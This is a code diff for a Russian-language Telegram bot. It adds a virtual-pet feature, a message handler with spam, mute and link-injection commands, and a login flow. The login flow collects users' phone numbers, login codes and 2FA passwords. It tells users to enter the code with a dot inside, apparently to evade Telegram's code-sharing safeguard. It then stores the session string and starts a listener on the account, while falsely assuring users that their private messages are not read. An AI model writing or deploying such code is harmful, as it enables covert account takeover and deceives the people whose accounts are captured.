+                update_child_full(child["id"], new_health, new_values)
 
-        final_text = text_raw
-        need_modify = False
-        parse_mode = None
-        if chat_id in substitutions:
-            sub = substitutions[chat_id]
-            final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
-            need_modify = True
-            parse_mode = "HTML"
-        if chat_id in link_chats and CHANNEL_LINK:
-            has_link = False
-            if message.entities:
-                for entity in message.entities:
-                    if entity.type in ["url", "text_link"]:
-                        has_link = True
-                        break
-            if not has_link and CHANNEL_LINK not in final_text:
-                final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
-                need_modify = True
-                parse_mode = "HTML"
-        if need_modify:
-            await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)
+                for key in reminders_to_send:
+                    try:
+                        await bot.send_message(
+                            child["owner_id"],
+                            f"{child['name']}: {REMINDER_PHRASES[key]}",
+                            reply_markup=child_action_keyboard(child["id"], highlight=key)
+                        )
+                    except Exception:
+                        pass
 
-    except Exception as e:
-        logging.error(f"❌ Ошибка обработки сообщения: {e}")
+        except Exception as e:
+            logging.error(f"Ошибка decay-лупа детей: {e}")
 
-# ==================== ОБРАБОТЧИК КНОПОК ====================
+async def child_birthday_loop():
+    while True:
+        await asyncio.sleep(24 * 60 * 60)
+        try:
+            children = get_all_alive_children_full()
+            for child in children:
+                years, _ = get_game_age(child["birth_date"])
+                birth_date = child["birth_date"]
+                today = datetime.now(timezone.utc).date()
+                if isinstance(birth_date, datetime):
+                    birth_date = birth_date.date()
+
+                is_birthday_date = (birth_date.day == today.day and birth_date.month == today.month)
+                if is_birthday_date and years > child["last_birthday_year"] and years > 0:
+                    set_last_birthday_year(child["id"], years)
+                    gender_word = "Сыну" if child["gender"] == "m" else "Дочери"
+                    try:
+                        await bot.send_message(
+                            child["owner_id"],
+                            f"🎂 С днём рождения! {gender_word} {child['name']} сегодня исполнилось {years} лет!"
+                        )
+                    except Exception:
+                        pass
+        except Exception as e:
+            logging.error(f"Ошибка birthday-лупа: {e}")
+
+# ==================== ОБРАБОТЧИКИ КНОПОК ====================
 @dp.callback_query()
 async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data
     uid = callback.from_user.id
+    
+    # Если это callback ребёнка — обработано выше
+    if data.startswith("child_"):
+        return
     
     if data == "btn_features":
         await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
@@ -1563,6 +1478,454 @@ async def global_update_handler(update: Update, bot: Bot):
     except Exception as e:
         logging.error(f"❌ Ошибка обработчика удалений: {e}")
 
+# ==================== ОСНОВНОЙ ОБРАБОТЧИК ====================
+@dp.message()
+@dp.business_message()
+async def handle(message: Message):
+    global bot_id, CHANNEL_LINK
+    try:
+        if not message.from_user or message.from_user.is_bot: return
+        uid = int(message.from_user.id)
+        chat_id = int(message.chat.id)
+        bc_id = message.business_connection_id
+        save_user_info(uid, message.from_user.username, message.from_user.first_name)
+        owner_id = bc_owners.get(bc_id) if bc_id else None
+
+        if bc_id:
+            chat_name = message.chat.title or message.chat.first_name or "Чат"
+            save_user_chat(uid, chat_id, chat_name)
+            chat_tuple = (chat_id, bc_id)
+            if chat_tuple in recent_business_chats:
+                recent_business_chats.remove(chat_tuple)
+            recent_business_chats.append(chat_tuple)
+            if len(recent_business_chats) > 100:
+                recent_business_chats.pop(0)
+
+        if uid in banned_users or (owner_id and owner_id in banned_users): return
+
+        if bc_id:
+            if bc_id not in bc_owners:
+                try:
+                    conn_info = await bot.get_business_connection(bc_id)
+                    bc_owners[bc_id] = int(conn_info.user.id)
+                    save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
+                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
+                    owner_id = int(conn_info.user.id)
+                except: pass
+            is_from_me = (uid == owner_id) if owner_id else False
+        else:
+            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])
+
+        if bot_id is None:
+            me = await bot.get_me()
+            bot_id = me.id
+
+        if bc_id:
+            if bc_id not in active_chats: active_chats[bc_id] = set()
+            active_chats[bc_id].add(chat_id)
+
+        if message.text:
+            cache_key = (chat_id, message.message_id)
+            msg_cache[cache_key] = {
+                "text": message.text, 
+                "user": message.from_user.first_name or "Пользователь",
+                "user_id": uid,
+                "chat_id": chat_id,
+                "bc_id": bc_id
+            }
+            if len(msg_cache) > 5000:
+                msg_cache.pop(next(iter(msg_cache)))
+
+        if uid in mutes and datetime.now() < mutes[uid]["until"]:
+            await delete_msg(chat_id, message.message_id, bc_id)
+            return
+
+        if not is_from_me: return
+
+        if chat_id in reply_guard_chats and message.reply_to_message:
+            await delete_msg(chat_id, message.message_id, bc_id)
+            return
+
+        text_raw = message.text
+        if not text_raw: return
+        low = text_raw.lower().strip()
+        task_key = (chat_id, bc_id)
+        current_owner = owner_id or uid
+
+        if is_calculator_expression(text_raw):
+            result, error = calculate_expression(text_raw)
+            if result is not None:
+                formatted_result = f"{result:.10f}".rstrip('0').rstrip('.') if isinstance(result, float) else str(result)
+                new_text = f"{text_raw} = <b>{formatted_result}</b>"
+                edited = await edit_message(chat_id, message.message_id, new_text, bc_id, parse_mode="HTML")
+                if not edited:
+                    try:
+                        kwargs = {"chat_id": chat_id, "text": new_text, "parse_mode": "HTML"}
+                        if bc_id: kwargs["business_connection_id"] = bc_id
+                        await bot.send_message(**kwargs)
+                    except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
+                return
+            elif error:
+                try:
+                    kwargs = {"chat_id": chat_id, "text": error, "parse_mode": "HTML"}
+                    if bc_id: kwargs["business_connection_id"] = bc_id
+                    await bot.send_message(**kwargs)
+                except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
+                return
+
+        if low == ".стоп":
+            save_setting(chat_id, 'enabled_links', False)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == ".старт":
+            save_setting(chat_id, 'enabled_links', True)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low.startswith("+линк"):
+            parts = text_raw.split(maxsplit=1)
+            if len(parts) > 1:
+                new_link = parts[1].strip()
+                if not new_link.startswith("http"): new_link = "https://t.me/" + new_link.lstrip("@")
+                CHANNEL_LINK = new_link
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low.startswith("подмена "):
+            parts = text_raw.split(maxsplit=2)
+            if len(parts) >= 2:
+                if parts[1].lower() == "выкл":
+                    save_substitution(chat_id, None, None)
+                else:
+                    mode = int(parts[2]) if len(parts) == 3 and parts[2] in ["1", "2"] else 1
+                    save_substitution(chat_id, parts[1], mode)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == "печать -":
+            save_setting(chat_id, 'typing_disabled', True)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == "печать +":
+            save_setting(chat_id, 'typing_disabled', False)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == "+реплай":
+            save_setting(chat_id, 'reply_guard', True)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == "-реплай":
+            save_setting(chat_id, 'reply_guard', False)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low == "ss":
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            text = user_spam_texts.get(str(current_owner))
+            if not text:
+                kwargs = {
+                    "chat_id": chat_id,
+                    "text": "⚠️ Сначала задайте текст через команду: <code>set [текст]</code>",
+                    "parse_mode": "HTML"
+                }
+                if bc_id: kwargs["business_connection_id"] = bc_id
+                await bot.send_message(**kwargs)
+                return
+            reply_to = message.reply_to_message.message_id if message.reply_to_message else None
+            if task_key in spam_tasks: spam_tasks[task_key].cancel()
+            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, reply_to, text))
+            return
+        if low == "dd":
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            if task_key in spam_tasks:
+                spam_tasks[task_key].cancel()
+                del spam_tasks[task_key]
+            return
+        if low.startswith("set "):
+            save_spam_text(str(current_owner), text_raw[4:].strip())
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            return
+        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
+            try:
+                minutes = int(re.search(r"\d+", text_raw).group())
+                if message.reply_to_message and message.reply_to_message.from_user:
+                    target_user = message.reply_to_message.from_user
+                    target_id = target_user.id
+                    target_name = target_user.first_name
+                else:
+                    target_id = chat_id
+                    target_name = message.chat.first_name or "Пользователь"
+                mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
+                asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
+                await clear_cmd(chat_id, message.message_id, bc_id)
+                user_link = get_user_mention(target_id, target_name)
+                kwargs = {
+                    "chat_id": chat_id,
+                    "text": f"🔇 {user_link} выдан <b>МУТ</b> на {minutes} мин.",
+                    "parse_mode": "HTML"
+                }
+                if bc_id: kwargs["business_connection_id"] = bc_id
+                await bot.send_message(**kwargs)
+            except: pass
+            return
+        if low in [".размут", "!размут"]:
+            if message.reply_to_message and message.reply_to_message.from_user:
+                target_user = message.reply_to_message.from_user
+                target_id = target_user.id
+                target_name = target_user.first_name
+            else:
+                target_id = chat_id
+                target_name = message.chat.first_name or "Пользователь"
+            mutes.pop(target_id, None)
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            user_link = get_user_mention(target_id, target_name)
+            kwargs = {
+                "chat_id": chat_id,
+                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
+                "parse_mode": "HTML"
+            }
+            if bc_id: kwargs["business_connection_id"] = bc_id
+            await bot.send_message(**kwargs)
+            return
+        if low in ["мой ид", "моид"]:
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            my_link = get_user_mention(uid, message.from_user.first_name)
+            kwargs = {
+                "chat_id": chat_id,
+                "text": f"🆔 {my_link} (<code>{uid}</code>)",
+                "parse_mode": "HTML"
+            }
+            if bc_id: kwargs["business_connection_id"] = bc_id
+            await bot.send_message(**kwargs)
+            return
+        if low in ["твой ид", "твоид"]:
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            target_user = message.reply_to_message.from_user if message.reply_to_message else None
+            target_id = target_user.id if target_user else (chat_id if chat_id > 0 else None)
+            if target_id:
+                t_fname = target_user.first_name if target_user else None
+                t_link = get_user_mention(target_id, t_fname)
+                kwargs = {
+                    "chat_id": chat_id,
+                    "text": f"🆔 {t_link} (<code>{target_id}</code>)",
+                    "parse_mode": "HTML"
+                }
+                if bc_id: kwargs["business_connection_id"] = bc_id
+                await bot.send_message(**kwargs)
+            return
+        if low == "!команды":
+            await clear_cmd(chat_id, message.message_id, bc_id)
+            kwargs = {
+                "chat_id": chat_id,
+                "text": TEXT_COMMANDS_HELP,
+                "parse_mode": "HTML"
+            }
+            if bc_id: kwargs["business_connection_id"] = bc_id
+            await bot.send_message(**kwargs)
+            return
+
+        final_text = text_raw
+        need_modify = False
+        parse_mode = None
+        if chat_id in substitutions:
+            sub = substitutions[chat_id]
+            final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
+            need_modify = True
+            parse_mode = "HTML"
+        if chat_id in link_chats and CHANNEL_LINK:
+            has_link = False
+            if message.entities:
+                for entity in message.entities:
+                    if entity.type in ["url", "text_link"]:
+                        has_link = True
+                        break
+            if not has_link and CHANNEL_LINK not in final_text:
+                final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
+                need_modify = True
+                parse_mode = "HTML"
+        if need_modify:
+            await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)
+
+    except Exception as e:
+        logging.error(f"❌ Ошибка обработки сообщения: {e}")
+
+# ==================== АВТОРИЗАЦИЯ ====================
+@dp.callback_query(F.data == "btn_group_auth")
+async def group_auth(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    if get_session(callback.from_user.id):
+        await callback.message.answer("✅ Аккаунт уже подключен!")
+        return
+    
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    
+    await callback.message.answer(
+        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
+        "Личная переписка не читается и не сохраняется.\n\n"
+        "📱 <b>Введите номер телефона</b>\n\n"
+        "Отправьте номер в формате:\n"
+        "<code>79123456789</code>\n\n"
+        "Или нажмите кнопку ниже для отправки контакта.",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+    await state.set_state(AuthState.waiting_for_phone)
+
+@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
+async def process_phone(message: Message, state: FSMContext):
+    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
+    try:
+        if message.contact:
+            phone = message.contact.phone_number
+        elif message.text:
+            phone = re.sub(r'[^\d+]', '', message.text.strip())
+            if phone.startswith('8') and len(phone) == 11:
+                phone = '+7' + phone[1:]
+            elif not phone.startswith('+'):
+                phone = '+' + phone
+        else:
+            await message.answer("❌ Отправь номер телефоном или контактом")
+            return
+        
+        logging.info(f"📱 Номер: {phone}")
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        await client.send_code_request(phone)
+        
+        await state.update_data(
+            phone=phone,
+            client=client
+        )
+        
+        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
+        ])
+        
+        await message.answer(
+            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
+            f"Номер: <code>{phone}</code>\n\n"
+            f"⚠️ <b>ВАЖНО:</b>\n"
+            f"1️⃣ Нажми «Посмотреть код»\n"
+            f"2️⃣ Открой Telegram и посмотри код\n"
+            f"3️⃣ <b>Введи код с точкой внутри</b>\n"
+            f"<i>Например: 56.785</i>",
+            parse_mode="HTML",
+            reply_markup=view_code_kb
+        )
+        await state.set_state(AuthState.waiting_for_code)
+        
+    except FloodWaitError as e:
+        await message.answer(f"⏳ Подожди {e.seconds} секунд")
+        await state.clear()
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
+
+@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
+async def process_code(message: Message, state: FSMContext):
+    code_raw = message.text.strip()
+    code = code_raw.replace('.', '')
+    
+    logging.info(f"Код: {code_raw} -> {code}")
+    
+    if not code.isdigit():
+        await message.answer(
+            "❌ <b>Неверный формат!</b>\n\n"
+            "Код должен содержать только цифры и точку.\n"
+            "Например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
+        return
+    
+    data = await state.get_data()
+    phone = data.get("phone")
+    client = data.get("client")
+    
+    if not phone or not client:
+        await message.answer("❌ Данные устарели. Начни заново")
+        await state.clear()
+        return
+    
+    await message.answer("🔄 Проверка кода...")
+    
+    try:
+        await client.sign_in(phone=phone, code=code)
+        
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
+        await start_telethon_listener(message.from_user.id, final_session)
+        
+        await client.disconnect()
+        
+        await message.answer(
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        await state.clear()
+        
+    except SessionPasswordNeededError:
+        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
+        await state.set_state(AuthState.waiting_for_2fa)
+        
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
+        await message.answer(
+            "❌ <b>Неверный код!</b>\n\n"
+            "Проверь код и попробуй еще раз.\n"
+            "⚠️ Не забудь поставить точку внутри кода.\n"
+            "Например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
+        
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
+
+@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
+async def process_2fa(message: Message, state: FSMContext):
+    password = message.text.strip()
+    data = await state.get_data()
+    client = data.get("client")
+    phone = data.get("phone")
+    
+    if not client or not phone:
+        await message.answer("❌ Данные устарели. Начни заново")
+        await state.clear()
+        return
+    
+    try:
+        await client.sign_in(password=password)
+        
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
+        await start_telethon_listener(message.from_user.id, final_session)
+        
+        await client.disconnect()
+        
+        await message.answer(
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        await state.clear()
+        
+    except Exception as e:
+        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
+
 # ==================== ВЕБ-СЕРВЕР ====================
 async def handle_ping(request):
     return web.Response(text="Bot is running!")
@@ -1588,6 +1951,9 @@ async def main():
     asyncio.create_task(promo_broadcaster())
     asyncio.create_task(check_promo_deletions())
     asyncio.create_task(clean_inactive_connections())
+    # ===== ЗАДАЧИ РЕБЁНКА =====
+    asyncio.create_task(child_decay_loop())
+    asyncio.create_task(child_birthday_loop())
     logging.info("🚀 БОТ ЗАПУЩЕН!")
     await dp.start_polling(
         bot,
